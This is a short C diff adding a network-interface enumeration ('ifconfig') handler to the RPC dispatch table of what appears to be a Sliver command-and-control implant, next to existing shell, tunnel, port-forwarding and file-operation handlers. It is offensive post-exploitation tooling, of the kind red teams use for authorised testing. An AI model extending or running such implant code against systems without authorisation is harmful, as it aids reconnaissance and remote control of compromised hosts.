@@ -491,6 +491,18 @@ static int handle_chtimes_entry(const sliver_envelope_t *req, sliver_buf_t *out)
   return sliver_path_resp_encode(out, path, err);
 }
 
+/* --- ifconfig ---------------------------------------------------------- */
+static int handle_ifconfig(const sliver_envelope_t *req, sliver_buf_t *out) {
+  sliver_iface_t ifs[32];
+  int n;
+
+  (void)req;
+  n = sliver_net_list(ifs, (int)(sizeof(ifs) / sizeof(ifs[0])));
+  LOG_DEBUG("rpc: ifconfig -> %d interface(s)", n);
+  return sliver_ifconfig_encode(out, ifs, n > 0 ? n : 0,
+                                n < 0 ? "ifconfig: enumeration failed" : NULL);
+}
+
 /* --- async wrapper for file operations ---------------------------------- */
 typedef struct {
   int kind;
@@ -615,6 +627,7 @@ static const rpc_entry_t g_handlers[] = {
     {SLIVER_MSG_TUNNEL_CLOSE, 0, sliver_rpc_handle_tunnel_close},
     {SLIVER_MSG_SHELL_RESIZE_REQ, 0, sliver_rpc_handle_shell_resize},
     {SLIVER_MSG_PORTFWD_REQ, SLIVER_MSG_PORTFWD, sliver_rpc_handle_portfwd},
+    {SLIVER_MSG_IFCONFIG_REQ, SLIVER_MSG_IFCONFIG, handle_ifconfig},
     {SLIVER_MSG_CP_REQ, SLIVER_MSG_CP, handle_cp_async},
     {SLIVER_MSG_MV_REQ, SLIVER_MSG_MV, handle_mv_async},
     {SLIVER_MSG_CHMOD_REQ, SLIVER_MSG_CHMOD, handle_chmod_async},
@@ -674,6 +687,7 @@ void sliver_rpc_dispatch(const sliver_envelope_t *req, sliver_rpc_result_t *resu
     return;
   }
 }
+
 
 
 
